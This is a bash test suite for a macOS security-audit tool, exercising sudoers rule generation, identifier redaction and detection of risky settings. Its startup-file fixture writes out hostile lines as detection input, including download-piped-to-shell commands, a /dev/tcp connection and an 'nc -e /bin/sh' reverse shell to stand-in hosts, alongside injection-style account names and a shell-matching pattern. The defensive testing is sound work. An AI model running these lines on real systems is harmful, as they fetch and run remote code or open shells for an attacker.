#!/bin/bash
# Fixture tests for the logic functions in macassay. Development only; not shipped.
# Usage: dev/test.sh   (no root, no network; exits non-zero when a case fails)

cd "$(dirname "$0")/.." || exit 1
# shellcheck source=/dev/null  # the suite lints macassay on its own
MACASSAY_LIB=1 . ./macassay
T=$(mktemp -d /tmp/macassay-test.XXXXXX) || exit 1
# A watchdog stops the suite after 60 seconds, so a hang fails instead of stalling.
( sleep 60; echo "FAIL suite timed out after 60 seconds" >&2; kill -TERM $$ ) & WD=$!
trap '{ kill "$WD"; wait "$WD"; } 2>/dev/null; rm -rf "$T"' EXIT

FAILS=0
check() { local name="$1"; shift; if "$@"; then echo "ok   $name"; else echo "FAIL $name"; FAILS=$((FAILS+1)); fi; }
has()   { grep -qF -- "$2" "$1"; }
hasnt() { ! grep -qF -- "$2" "$1"; }
not()   { ! "$@"; }
visudo_ok() { /usr/sbin/visudo -c -f "$1" >/dev/null 2>&1; }

ACCTS='account root 0 /var/root
account alice 501 /Users/alice
account bob 502 /Users/bob
account _www 70 /Library/WebServer
sudoersd macassay
sudoersd extra_rules'

# F1: a normal account list gives a valid file for the granted user.
printf '%s\n' "$ACCTS" | gen_rules bob arm64 > "$T/f1" 2> "$T/f1.err"
check "F1 gen_rules exit status" [ $? -eq 0 ]
check "F1 visudo accepts the rules" visudo_ok "$T/f1"
check "F1 rules for alice" has "$T/f1" "/usr/bin/ssh-keygen -l -f /Users/alice/.ssh/authorized_keys"
check "F1 rules for root" has "$T/f1" "/bin/ls -ln /var/root/Library/LaunchAgents"
check "F1 no rules for the granted user" hasnt "$T/f1" "/Users/bob"
check "F1 no rules for system accounts" hasnt "$T/f1" "/Library/WebServer"
check "F1 sudoers.d files" has "$T/f1" "/bin/cat /etc/sudoers.d/extra_rules"
check "F1 always_set_home follows the alias" [ "$(grep -n 'Cmnd_Alias' "$T/f1" | cut -d: -f1)" -lt "$(grep -n 'always_set_home' "$T/f1" | cut -d: -f1)" ]
check "F1 grant line" has "$T/f1" "bob ALL = (root) NOPASSWD: MACASSAY"

# F2: no wildcards, no ALL in a command, no shell or interpreter, bputil only on Apple silicon.
grep '^    /' "$T/f1" > "$T/f2.cmds"
check "F2 no * in any rule" hasnt "$T/f1" "*"
check "F2 no ALL in a command" hasnt "$T/f2.cmds" "ALL"
check "F2 no shell, interpreter, editor or sqlite3" [ -z "$(awk '{print $1}' "$T/f2.cmds" | grep -E '/(ba|z|k|c|tc|da)?sh$|python|perl|ruby|osascript|vim?$|nano|emacs|sqlite3|env$')" ]
check "F2 bputil on arm64" has "$T/f1" "/usr/bin/bputil -d"
printf '%s\n' "$ACCTS" | gen_rules bob x86_64 > "$T/f2.intel" 2>/dev/null
check "F2 no bputil on Intel" hasnt "$T/f2.intel" "bputil"

# F3: hostile account names, home folders and sudoers.d names are skipped with a warning.
HOSTILE="$ACCTS
account bad,name 503 /Users/badname
account ev*l 504 /Users/evil
account dots 505 /Users/../etc
account outside 506 /tmp/x
account -dash 507 /Users/dash
account colon:x 508 /Users/c
account eq=x 509 /Users/e
account paren( 510 /Users/p
account back\\slash 511 /Users/b
account spacey 512 /Users/with space
account root 0 /Users/rootfake
sudoersd bad.name
sudoersd st*r
sudoersd br[acket
sudoersd with space"
printf '%s\n' "$HOSTILE" | gen_rules bob arm64 > "$T/f3" 2> "$T/f3.err"
check "F3 gen_rules still succeeds" [ $? -eq 0 ]
check "F3 visudo accepts the rules" visudo_ok "$T/f3"
for bad in badname evil "/Users/../etc" /tmp/x /Users/dash /Users/c /Users/e /Users/p /Users/b "with space" rootfake bad.name "st*r" "br[acket"; do
  check "F3 skips $bad" hasnt "$T/f3" "$bad"
done
check "F3 warns for each skipped item" [ "$(grep -c Skipping "$T/f3.err")" -ge 15 ]

# F4: the granted user must exist and be a regular account.
for u in root _www nosuch "bad name"; do
  printf '%s\n' "$ACCTS" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses granted user '$u'" [ $? -ne 0 ]
done
# A name that reads as a sudoers alias, or ALL, would widen the grant line.
for u in ALL ADMIN_1; do
  printf '%s\naccount %s 503 /Users/%s\n' "$ACCTS" "$u" "$u" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses alias-like user '$u'" [ $? -ne 0 ]
done

# F5: sudo refusals are told apart from a command's own failure.
printf 'sudo: a password is required\n' > "$T/e1"
printf "Sorry, user bob is not allowed to execute '/bin/cat /x' as root on host.\n" > "$T/e2"
printf 'sudo: /usr/bin/bputil: command not found\n' > "$T/e3"
printf 'ls: /Users/alice/.zlogin: No such file or directory\n' > "$T/e4"
: > "$T/e5"
check "F5 password required is a refusal" classify_refusal 1 "$T/e1"
check "F5 not allowed is a refusal" classify_refusal 1 "$T/e2"
check "F5 missing command is a refusal" classify_refusal 1 "$T/e3"
check "F5 command failure is not a refusal" not classify_refusal 1 "$T/e4"
check "F5 success is not a refusal" not classify_refusal 0 "$T/e5"

# F6: NOPASSWD rules are found and rated.
cat > "$T/sudoers" <<'EOF'
# alice ALL = (ALL) NOPASSWD: ALL   (a comment)
Defaults env_reset
%admin ALL = (ALL) ALL
alice ALL = (ALL) NOPASSWD: ALL
bob ALL = (root) NOPASSWD: /bin/kill
carol ALL = NOPASSWD:ALL
dave ALL = (root) NOPASSWD: ALLOWED_CMDS
erin ALL = (root) \
    NOPASSWD: ALL
Cmnd_Alias X = /bin/a, \
    /bin/b
#501 ALL = (ALL) NOPASSWD: ALL
frank ALL = (root) NOPASSWD: SETENV: ALL
gina ALL = (root) NOPASSWD:/bin/ls,ALL
#includedir /private/etc/sudoers.d
EOF
classify_sudoers < "$T/sudoers" > "$T/f6"
check "F6 six NOPASSWD: ALL rules are HIGH" [ "$(cut -f2 "$T/f6" | grep -c '^HIGH')" -eq 6 ]
check "F6 a #UID rule is not a comment" has "$T/f6" "#501 ALL = (ALL) NOPASSWD: ALL"
check "F6 two other NOPASSWD rules are LOW" [ "$(cut -f2 "$T/f6" | grep -c '^LOW')" -eq 2 ]
check "F6 IDs for the two risks" [ "$(cut -f1 "$T/f6" | sort -u | paste -sd, -)" = "MA-ACCOUNTS-005,MA-ACCOUNTS-006" ]
check "F6 continued line joined" has "$T/f6" "erin ALL = (root) NOPASSWD: ALL"
check "F6 comments, includes and Defaults ignored" [ "$(wc -l < "$T/f6" | tr -d ' ')" -eq 8 ]

# F7: allow-lists keep settings and drop identifiers.
# The bputil fixture follows real macOS 27.2 output, with identifiers replaced.
cat > "$T/bputil" <<'EOF'
OS Type                                       : macOS
Local Policy Nonce Hash                 (lpnh): 1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF
Unique Chip ID                          (ECID): 0x123456789ABCDE
Security Mode                           (CSEC): 1
Volume Group UUID                       (vuid): 11111111-2222-3333-4444-555555555555
Security Mode:               Reduced    (smb0): 1
3rd Party Kexts Status:      Enabled    (smb2): 1
DEP-allowed MDM Control:     Enabled    (smb4): 1
SIP Status:                  Enabled    (sip0): absent
EOF
filter_bputil < "$T/bputil" > "$T/f7b"
check "F7 bputil keeps the security mode" has "$T/f7b" "Security Mode:               Reduced"
check "F7 bputil keeps SIP" has "$T/f7b" "SIP Status"
check "F7 bputil keeps kexts" has "$T/f7b" "Kexts Status"
check "F7 bputil drops UUIDs, hashes and the chip ID" [ -z "$(grep -E '1111|ABCDEF|ECID' "$T/f7b")" ]
check "F7 bputil mode from the smb0 line" [ "$(bputil_mode < "$T/bputil")" = Reduced ]
check "F7 bputil mode Full" [ "$(printf 'Security Mode                           (CSEC): 1\nSecurity Mode:               Full       (smb0): absent\n' | bputil_mode)" = Full ]
cat > "$T/profiles" <<'EOF'
There are 2 configuration profiles installed
_computerlevel[1] attribute: name: Wi-Fi
_computerlevel[1] attribute: profileIdentifier: com.example.wifi
_computerlevel[1] attribute: profileUUID: 11111111-2222-3333-4444-555555555555
_computerlevel[2] attribute: name: 22222222-3333-4444-5555-666666666666
_computerlevel[1] attribute: organization: Example
_computerlevel[1] attribute: installationDate: 2026-01-01
EOF
filter_profiles < "$T/profiles" > "$T/f7p"
check "F7 profiles keeps names, identifiers, organization" [ "$(wc -l < "$T/f7p" | tr -d ' ')" -eq 4 ]
check "F7 profiles drops UUIDs" [ -z "$(grep -E '1111|2222' "$T/f7p")" ]

# F8: startup-file matches name the pattern and never copy the line.
cat > "$T/rc" <<'EOF'
curl -s https://x.example | sh   # SECRET_TOKEN_1
export X=$(echo abc | base64 -D) SECRET_TOKEN_2
bash -c "$(curl -fsSL https://y.example)" SECRET_TOKEN_3
wget -qO- z.example | bash
cat a | bash -s
eval "$(curl q.example)"
exec 3<>/dev/tcp/192.0.2.1/80
nc -e /bin/sh h.example
osascript -e 'beep'
echo harmless
EOF
rc_hits "$T/rc" "$T/missing" > "$T/f8"
check "F8 no line text in the output" [ -z "$(grep -E 'SECRET|example|harmless' "$T/f8")" ]
for want in "1: download piped to a shell" "2: base64 decode" "3: shell running a download" "4: download piped to a shell" \
            "5: shell reading a script from a pipe" "6: eval of a download" "7: /dev/tcp connection" "8: nc with -e" "9: osascript -e"; do
  check "F8 finds $want" has "$T/f8" "$T/rc:$want"
done
check "F8 no match on a harmless line" hasnt "$T/f8" "$T/rc:10:"

# F9: SSH methods that accept a password.
check "F9 password" ssh_accepts_password "(publickey,password)"
check "F9 keyboard-interactive" ssh_accepts_password "(publickey,keyboard-interactive)"
check "F9 publickey alone" not ssh_accepts_password "(publickey)"

# F10: report text from the audited Mac stays in one cell.
# shellcheck disable=SC2016  # the backticks are literal test input
out=$(printf 'evil\nHIGH\tArea|x`y`\rz' | clean_field)
check "F10 one line" [ "$(printf '%s\n' "$out" | wc -l | tr -d ' ')" -eq 1 ]
check "F10 no tab, pipe or backtick" [ -z "$(printf '%s' "$out" | tr -d -c '\t|`')" ]
check "F10 text kept" [ "$out" = "evil HIGH Area/xy z" ]

# F11: dashed UUIDs anywhere in the report are replaced.
out=$(printf '/Library/SystemExtensions/688AE699-C0FB-4B23-91E1-6ACB69076699/x and abcdefab-cdef-abcd-efab-cdef00000050\n' | redact_ids)
check "F11 UUIDs replaced" [ "$out" = "/Library/SystemExtensions/<UUID>/x and <UUID>" ]

# F12: crontab lines show the schedule and command name, never arguments or values.
printf '%s\n' '# comment' 'API_KEY=SECRET_A' '*/5 * * * * /usr/bin/curl -H "Authorization: SECRET_B" https://x' \
  '@reboot /Users/x/bin/start.sh SECRET_C' '0 3 * * * TOKEN=SECRET_D /bin/run' | crontab_summary > "$T/f12"
check "F12 no secrets" [ -z "$(grep SECRET "$T/f12" | grep -v 'API_KEY (value hidden)')" ]
check "F12 variable named without value" has "$T/f12" "environment variable API_KEY (value hidden)"
check "F12 schedule and command" has "$T/f12" "*/5 * * * *  curl (arguments hidden)"
check "F12 @reboot entry" has "$T/f12" "@reboot  start.sh (arguments hidden)"
check "F12 inline variables hidden" has "$T/f12" "0 3 * * *  (command with inline variables) (arguments hidden)"

# F13: a program owned by this user is HIGH.
touch "$T/prog"
check "F13 user-owned program is HIGH" [ "$(chain_writable "$T/prog" | cut -f1)" = HIGH ]

# F14: a failed install rollback is reported, not claimed as restored.
mkdir "$T/sd"
sudoers_ok() { ! grep -qs BAD "$RULES"; }
( RULES="$T/sd/macassay"; TMP="$T/r1"; mkdir "$TMP"; echo BAD > "$RULES"
  rollback_rules && [ ! -e "$RULES" ] ) 2>/dev/null
check "F14 no backup: bad file removed, rollback succeeds" [ $? -eq 0 ]
( RULES="$T/sd/macassay"; TMP="$T/r2"; mkdir "$TMP"; echo BAD > "$RULES"; echo good > "$TMP/old"
  rollback_rules ) 2>/dev/null
check "F14 backup not installable: rollback returns 2" [ $? -eq 2 ]
check "F14 backup not installable: bad file removed" [ ! -e "$T/sd/macassay" ]
check "F14 no .macassay.new left behind" [ ! -e "$T/sd/.macassay.new" ]
( RULES="$T/sd/macassay"; TMP="$T/r3"; mkdir "$TMP"; sudoers_ok() { false; }; echo BAD > "$RULES"
  rollback_rules ) 2>/dev/null
check "F14 sudo still broken: rollback returns 1" [ $? -eq 1 ]

# F15: every finding call names a literal ID, or "$id" from a function that prints literal IDs, and one of the 14 section labels.
LABELS="Health Backups Updates Platform Management Sharing Network Persistence Apps Accounts Credentials Developer Trust Events"
LABRE=$(echo "$LABELS" | tr 'a-z ' 'A-Z|')
grep -v '^[[:space:]]*#' macassay | grep -oE '(^|[^A-Za-z_])finding [A-Z"$][^ ]* [^ ]+ [^ ]+' | sed -E 's/^[^f]*//' > "$T/f15"
check "F15 finding calls found" [ "$(grep -c . "$T/f15")" -ge 57 ]
check "F15 every call has a literal ID or \$id" [ -z "$(awk '$2 !~ /^(MA-[A-Z]+-[0-9][0-9][0-9]|"\$id")$/' "$T/f15")" ]
check "F15 every call names a section label" [ -z "$(awk -v l=" $LABELS " 'index(l, " " $4 " ") == 0' "$T/f15")" ]
check "F15 no flag calls left" [ -z "$(grep -v '^[[:space:]]*#' macassay | grep -E '(^|[;&|{()]|then|do|else)[[:space:]]*flag ')" ]

# F16: every ID has a section label and three digits; call sites share an ID only where listed (one risk at two severities or two places).
grep -oE 'MA-[A-Za-z]+-[0-9]+' macassay | sort > "$T/f16"
check "F16 every ID has a label and three digits" [ -z "$(grep -vxE "MA-($LABRE)-[0-9]{3}" "$T/f16")" ]
grep -oE 'finding MA-[A-Z]+-[0-9]+' macassay | sort | uniq -d > "$T/f16d"
check "F16 shared IDs are only the listed ones" [ -z "$(grep -vxE 'finding (MA-HEALTH-003|MA-SHARING-007|MA-PLATFORM-009|MA-UPDATES-003)' "$T/f16d")" ]

# G1: long hex runs in certificate labels are masked; dashed UUIDs are still replaced.
h32=0123456789abcdef0123456789ABCDEF; h31=${h32:0:31}
check "G1 32 hex characters masked" [ "$(echo "CA $h32" | mask_hex)" = "CA <ID>" ]
check "G1 64 hex characters masked" [ "$(echo "CA $h32$h32 x" | mask_hex)" = "CA <ID> x" ]
check "G1 31 hex characters kept" [ "$(echo "CA $h31" | mask_hex)" = "CA $h31" ]
check "G1 redact_ids still replaces a UUID" [ "$(echo 11111111-2222-3333-4444-555555555555 | redact_ids)" = "<UUID>" ]

# G2, G17: trust settings count by the SecTrustSettings.h rule; names are masked and policy strings dropped.
cat > "$T/trust" <<'EOF'
Number of trusted certs = 5
Cert 0: Root A 0123456789abcdef0123456789abcdef
   Number of trust settings : 1
   Trust Setting 0:
      Policy OID            : SSL
      Policy String         : 192.0.2.10
      Result Type           : kSecTrustSettingsResultTrustRoot
Cert 1: No Result B
   Number of trust settings : 1
   Trust Setting 0:
      Policy OID            : SSL
Cert 2: Always C
   Number of trust settings : 0
Cert 3: Denied D
   Number of trust settings : 1
   Trust Setting 0:
      Result Type           : kSecTrustSettingsResultDeny
Cert 4: Unspecified E
   Number of trust settings : 1
   Trust Setting 0:
      Result Type           : kSecTrustSettingsResultUnspecified
EOF
trusted_certs < "$T/trust" | mask_hex > "$T/g17"
check "G17 TrustRoot, no result and zero settings count" [ "$(grep -c . "$T/g17")" -eq 3 ]
check "G17 Deny and Unspecified do not count" [ -z "$(grep -E 'Denied|Unspecified' "$T/g17")" ]
check "G2 names kept and masked" has "$T/g17" "Root A <ID>"
check "G2 policy strings dropped" hasnt "$T/g17" "192.0.2.10"

# G20: admin-group write is MEDIUM only under /Applications; group write counts when the group has other members.
( stat() { case "$3" in /Applications) echo "root drwxrwxr-x admin" ;; *) echo "root drwxr-xr-x wheel" ;; esac; }
  [ "$(chain_writable /Applications | cut -f1)" = MEDIUM ] )
check "G20 admin-writable folder under /Applications is MEDIUM" [ $? -eq 0 ]
( stat() { case "$3" in /Library) echo "root drwxrwxr-x admin" ;; *) echo "root drwxr-xr-x wheel" ;; esac; }
  [ "$(chain_writable /Library | cut -f1)" = HIGH ] )
check "G20 admin-writable folder under /Library is HIGH" [ $? -eq 0 ]
printf 'bob ALL = (root) NOPASSWD: %s\n' "$T/prog" | sudoers_findings /etc/sudoers > "$T/g20s"
check "G20 NOPASSWD for a user-writable program is HIGH" [ "$(cut -f1,2 "$T/g20s")" = $'MA-ACCOUNTS-008\tHIGH' ]
( chain_writable() { printf 'MEDIUM\tadmin group can write /Applications\n'; }
  printf 'bob ALL = (root) NOPASSWD: /Applications/Tool\n' | sudoers_findings /etc/sudoers | cut -f1,2 | grep -qx $'MA-ACCOUNTS-008\tHIGH' )
check "G20 NOPASSWD for an admin-writable program is HIGH" [ $? -eq 0 ]
( group_has_others() { [ "$1" = 20 ]; }
  printf '%s\n' '-rw-rw-r--  1 501  20  10 Nov 1 10:00 /Users/a/.zshrc' \
                '-rw-r--r--  1 502  20  10 Nov 1 10:00 /Users/a/.bashrc' \
                '-rw-r--r--  1 0  0  10 Nov 1 10:00 /Users/a/.profile' \
                '-rw-rw-r--  1 501  99  10 Nov 1 10:00 /Users/a/.zshenv' \
                '-rw-r--rw-  1 0  0  10 Nov 1 10:00 /Users/a/.zlogin' | rc_file_risks 501 a ) > "$T/g20rc"
check "G20 rc file writable by staff" has "$T/g20rc" $'/Users/a/.zshrc\twritable by group 20'
check "G20 rc file owned by another account" has "$T/g20rc" $'/Users/a/.bashrc\towned by UID 502'
check "G20 root-owned rc file gives nothing" hasnt "$T/g20rc" ".profile"
check "G20 group without other members gives nothing" hasnt "$T/g20rc" ".zshenv"
check "G20 rc file writable by everyone" has "$T/g20rc" ".zlogin"

# R7: severity rules for the startup-pattern split, the secure boot mode and the temporary-folder program.
printf '%s\n' 'echo x | base64 -d' "osascript -e 'beep'" > "$T/g21a"
printf '%s\n' 'curl -s https://x.example | sh' 'echo x | base64 -d' > "$T/g21b"
echo harmless > "$T/g21c"
for k in a b c; do rc_hits "$T/g21$k" > "$T/g21$k.h"; rc_pattern_sevs "$T/g21$k.h" > "$T/g21$k.s"; done
check "R7 base64 and osascript only give MEDIUM" [ "$(paste -sd, - < "$T/g21a.s")" = MEDIUM ]
check "R7 download-and-run plus base64 give HIGH and MEDIUM" [ "$(paste -sd, - < "$T/g21b.s")" = HIGH,MEDIUM ]
check "R7 no hits give nothing" [ ! -s "$T/g21c.s" ]
check "R7 boot mode Full gives nothing" [ -z "$(boot_policy_sev Full)" ]
check "R7 boot mode empty gives nothing" [ -z "$(boot_policy_sev '')" ]
check "R7 boot mode Reduced is MEDIUM" [ "$(boot_policy_sev Reduced)" = MEDIUM ]
check "R7 boot mode Permissive is HIGH" [ "$(boot_policy_sev Permissive)" = HIGH ]
check "R7 App Translocation path is not a temporary program" not temp_program /private/var/folders/ab/T/AppTranslocation/X/d/X.app/Contents/MacOS/X
check "R7 plain /private/var/folders path is a temporary program" temp_program /private/var/folders/ab/T/x/prog
check "R7 /Users/Shared path is a temporary program" temp_program /Users/Shared/prog
check "R7 /Applications program is not a temporary program" not temp_program /Applications/X.app/Contents/MacOS/X

# G11: missing update settings print the macOS default; the SoftwareUpdate domain is read one key at a time.
BODY="$T/g11"; : > "$BODY"
default_line "Automatic checks (AutomaticCheckEnabled)" "" "1, on"
default_line "Automatic download (AutomaticDownload)" 0 "1, on"
check "G11 missing key prints the macOS default" has "$T/g11" "- Automatic checks (AutomaticCheckEnabled): not set (macOS default: 1, on)"
check "G11 set key prints its value" has "$T/g11" "- Automatic download (AutomaticDownload): 0"
check "G11 no whole-domain read of SoftwareUpdate" [ -z "$(grep -E 'defaults read [^ ]*SoftwareUpdate[^ ]* *(2>/dev/null)? *(\||$)' macassay)" ]
check "G11 AutoInstallProductKeys is never read" hasnt macassay "AutoInstallProductKeys"

# G21: recent installs list non-Apple installs since the cutoff, without nested package lists.
cat > "$T/ih" <<'EOF'
[
  0 => {
    "date" => 2026-10-01 05:33:25 +0000
    "displayName" => "macOS 27.1"
    "displayVersion" => "27.1"
    "processName" => "softwareupdated"
  }
  1 => {
    "date" => 2026-11-20 05:39:05 +0000
    "displayName" => "Example App"
    "displayVersion" => "2.0"
    "packageIdentifiers" => [
      0 => "com.example.app"
    ]
    "processName" => "installer"
  }
  2 => {
    "date" => 2026-09-01 01:00:00 +0000
    "displayName" => "Old App"
    "displayVersion" => "1.0"
    "processName" => "installer"
  }
]
EOF
recent_installs 2026-10-25 < "$T/ih" > "$T/g21"
check "G21 recent non-Apple install listed" has "$T/g21" "2026-11-20  Example App 2.0"
check "G21 Apple and old installs skipped" [ "$(grep -c . "$T/g21")" -eq 1 ]

# G9: screen lock severities from sysadminctl text.
check "G9 immediate gives nothing" [ -z "$(screen_lock_sev 'screenLock delay is immediate')" ]
check "G9 5 seconds gives nothing" [ -z "$(screen_lock_sev 'screenLock delay is 5 seconds')" ]
check "G9 900 seconds is LOW" [ "$(screen_lock_sev 'screenLock delay is 900 seconds' | cut -f1)" = LOW ]
check "G9 7200 seconds is MEDIUM" [ "$(screen_lock_sev 'screenLock delay is 7200 seconds' | cut -f1)" = MEDIUM ]
check "G9 off is MEDIUM" [ "$(screen_lock_sev 'screenLock is off' | cut -f1)" = MEDIUM ]
check "G15 one screen lock finding call" [ "$(grep -c 'finding MA-PLATFORM-010' macassay)" -eq 1 ]
# G10: boot arguments.
check "G10 no boot arguments" [ -z "$(boot_args_sev '')" ]
check "G10 -v is LOW" [ "$(boot_args_sev '-v')" = LOW ]
check "G10 amfi argument is HIGH" [ "$(boot_args_sev 'amfi_get_out_of_my_way=1')" = HIGH ]

# G19: printer sharing from cupsd.conf.
printf 'Listen localhost:631\nListen /private/var/run/cupsd\n' > "$T/cups1"
printf 'Port 631\nListen /private/var/run/cupsd\n' > "$T/cups2"
printf 'Listen *:631\n' > "$T/cups3"
check "G19 localhost only is off" not cups_shared "$T/cups1"
check "G19 Port line is on" cups_shared "$T/cups2"
check "G19 Listen on all addresses is on" cups_shared "$T/cups3"

# G16, G18: PAM modules, bracketed controls, and include loops.
mkdir "$T/pam"
printf 'auth include other_file\nauth [success=ok default=die] /opt/evil/pam_x.so\naccount required pam_permit.so\nauth required /usr/lib/pam/pam_ok.so\n' > "$T/pam/svc"
printf 'auth substack svc\nsession optional /Users/Shared/pam_y.so\n' > "$T/pam/other_file"
( PAMD="$T/pam"; PAM_SEEN=""; pam_modules "$T/pam/svc" 1 ) > "$T/g16"
check "G16 bracketed control field" has "$T/g16" "/opt/evil/pam_x.so"
check "G16 module in an included file" has "$T/g16" "/Users/Shared/pam_y.so"
check "G18 include loop reads each file once" [ "$(grep -c . "$T/g16")" -eq 2 ]
# G15: one finding per authorization plugin, at its highest severity.
check "G15 unsigned, user-writable plugin gives one HIGH" [ "$(auth_plugin_finding unsigned $'HIGH\tx is owned by bob')" = $'MA-PERSISTENCE-012\tHIGH' ]
check "G15 unsigned plugin is MEDIUM" [ "$(auth_plugin_finding unsigned '')" = $'MA-PERSISTENCE-013\tMEDIUM' ]
check "G15 plugin signed by a developer is LOW" [ "$(auth_plugin_finding 'Team ABCDE12345' '')" = $'MA-PERSISTENCE-014\tLOW' ]
check "G15 Apple plugin gives nothing" [ -z "$(auth_plugin_finding Apple '')" ]

# G23: remote-support tool names from ps paths.
rs() { printf '%s\n' "$1" | remote_support_names; }
check "G23 AppleVNCServer gives nothing" [ -z "$(rs /System/Library/CoreServices/RemoteManagement/AppleVNCServer.bundle/Contents/MacOS/AppleVNCServer)" ]
check "G23 TeamViewer is listed" [ "$(rs /Applications/TeamViewer.app/Contents/MacOS/TeamViewer)" = TeamViewer ]
check "G23 vncserver is listed" [ "$(rs /usr/local/bin/vncserver)" = "RealVNC Server" ]
check "G23 sshd gives nothing" [ -z "$(rs /usr/sbin/sshd)" ]

# G8: debug ports. Only PIDs, classes and program paths leave the parsers.
printf '%s\n' '101 /Applications/Foo App.app/Contents/MacOS/Foo --remote-debugging-port=9222 --token=SECRET_A' \
  '102 /usr/bin/node --inspect-brk=0.0.0.0:9229 app.js' '103 /usr/bin/node --inspect-wait app.js' \
  '104 /usr/bin/node --inspect-port=9229 app.js' '105 /x/chrome --remote-debugging-pipe' \
  '106 awk / --(remote-debugging-port|inspect(-brk|-wait)?)(=|[[:space:]]|$)/ {print $1}' \
  '107 /usr/bin/node --inspect' | debug_pids > "$T/g8"
check "G8 PIDs of debug-port processes only" [ "$(paste -sd, - < "$T/g8")" = "101,102,103,107" ]
check "G8 no command text in the output" hasnt "$T/g8" "SECRET"
printf '%s\n' /usr/bin/node --inspect=0.0.0.0:9229 --token=SECRET_B | launch_debug_class > "$T/g8l"
check "G8 launch item non-loopback inspect" [ "$(cat "$T/g8l")" = nonloopback ]
check "G8 launch item output has no arguments" hasnt "$T/g8l" SECRET
check "G8 remote-debugging-address" [ "$(printf '%s\n' /x/Chrome --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 | launch_debug_class)" = nonloopback ]
check "G8 loopback by default" [ "$(printf '%s\n' /x/Chrome --remote-debugging-port=9222 | launch_debug_class)" = loopback ]
check "G8 pipe gives nothing" [ -z "$(printf '%s\n' /x/Chrome --remote-debugging-pipe | launch_debug_class)" ]
check "G8 bind loopback" [ "$(bind_class '127.0.0.1:9222')" = loopback ]
check "G8 bind on all addresses" [ "$(bind_class $'127.0.0.1:9222\n*:9229')" = nonloopback ]
check "G8 bind unknown" [ "$(bind_class '')" = unknown ]
# G15: a debug port running and set in a launch item gives one finding.
printf '%s\n' $'/x/Foo App\tloopback\trunning' $'/x/Foo App\tnonloopback\tlaunch item a.plist' | debug_findings > "$T/g15d"
check "G15 one debug finding per program" [ "$(grep -c . "$T/g15d")" -eq 1 ]
check "G15 that finding is HIGH" [ "$(cut -f1 "$T/g15d")" = HIGH ]
# G12: native-messaging host paths.
check "G12 host in /tmp is MEDIUM" [ "$(nmh_risk /tmp/x/host)" = MEDIUM ]
check "G12 missing host is LOW" [ "$(nmh_risk /var/empty/no/such/host)" = LOW ]
check "G12 normal host gives nothing" [ -z "$(nmh_risk /bin/ls)" ]
# G13: forced extensions by source and enrollment.
cat > "$T/chrome.plist" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>ExtensionInstallForcelist</key><array>
<string>abcdefghijklmnopabcdefghijklmnop;https://clients2.google.com/service/update2/crx</string>
</array></dict></plist>
PLIST
printf '{"policies":{"ExtensionSettings":{"a@b":{"installation_mode":"force_installed"},"c@d":{"installation_mode":"allowed"}}}}\n' > "$T/policies.json"
check "G13 Chromium forced ID without its update URL" [ "$(forced_ext_ids "$T/chrome.plist" ExtensionInstallForcelist)" = abcdefghijklmnopabcdefghijklmnop ]
check "G13 Firefox policies.json forced ID only" [ "$(forced_ext_ids "$T/policies.json" policies.ExtensionSettings)" = "a@b" ]
check "G13 managed, not enrolled is HIGH" [ "$(printf 'managed\tcom.google.Chrome\tx\n' | forced_ext_finding 0 | cut -f1,2)" = $'MA-APPS-005\tHIGH' ]
check "G13 local only, not enrolled is MEDIUM" [ "$(printf 'local\tcom.google.Chrome\tx\n' | forced_ext_finding 0 | cut -f1,2)" = $'MA-APPS-006\tMEDIUM' ]
check "G13 enrolled is INFO" [ "$(printf 'managed\tcom.google.Chrome\tx\n' | forced_ext_finding 1 | cut -f1,2)" = $'MA-APPS-007\tINFO' ]

# G7: sudoers content. One line per rule, at its highest severity, with the rule text.
cat > "$T/g7" <<'EOT'
Cmnd_Alias SHELLS = /bin/sh, /bin/zsh
Defaults !authenticate
Defaults env_keep += "DYLD_LIBRARY_PATH"
Defaults	env_reset
Defaults	env_keep += "HOME MAIL"
Defaults	env_keep += "SSH_AUTH_SOCK"
Defaults	!log_allowed
a ALL = (root) NOPASSWD: ALL
b ALL = (root) NOPASSWD: /usr/bin/python3
c ALL = (root) NOPASSWD: SHELLS
d ALL = (root) NOPASSWD: /usr/bin/ssh-keygen
x ALL = (root) NOPASSWD: /bin/ls, (root) NOPASSWD: /bin/sh
y ALL = (root) NOPASSWD: /bin/ls, (operator) /bin/sh
z ALL = (root) NOPASSWD: /bin/ls, PASSWD: /bin/sh
w ALL = (root) NOPASSWD: /bin/ls, (root, operator) NOPASSWD: /bin/sh
u1 ALL = (root) NOPASSWD: sha256:0a1b2c3d4e5f /bin/sh
u2 ALL = NOPASSWD: /bin/ls, CWD=/ /bin/sh
u3 ALL = (root) NOPASSWD: SHA512:0a1b2c3d4e5f TIMEOUT=5 /usr/bin/ssh-keygen
EOT
classify_sudoers < "$T/g7" > "$T/g7.out"
check "G7 !authenticate is HIGH" has "$T/g7.out" $'MA-ACCOUNTS-010\tHIGH\tDefaults !authenticate'
check "G7 env_keep DYLD is MEDIUM" has "$T/g7.out" $'MA-ACCOUNTS-011\tMEDIUM\tDefaults env_keep += "DYLD_LIBRARY_PATH"'
check "G7 stock Defaults give nothing" [ -z "$(grep -E 'HOME MAIL|SSH_AUTH_SOCK|env_reset|log_allowed' "$T/g7.out")" ]
check "G7 NOPASSWD: ALL is HIGH" has "$T/g7.out" $'MA-ACCOUNTS-005\tHIGH\ta ALL'
check "G7 python is a code-loading program" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tb ALL'
check "G7 alias holding a shell" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tc ALL'
check "G7 ssh-keygen is not ssh" has "$T/g7.out" $'MA-ACCOUNTS-006\tLOW\td ALL'
check "G7 one line per rule" [ "$(grep -c . "$T/g7.out")" -eq 13 ]
check "G7 command with its own Runas spec and NOPASSWD" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tx ALL'
check "G7 Runas spec after the tag carries it over" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\ty ALL'
check "G7 command after PASSWD is not passwordless" has "$T/g7.out" $'MA-ACCOUNTS-006\tLOW\tz ALL = (root) NOPASSWD: /bin/ls, PASSWD: /bin/sh\t/bin/ls'
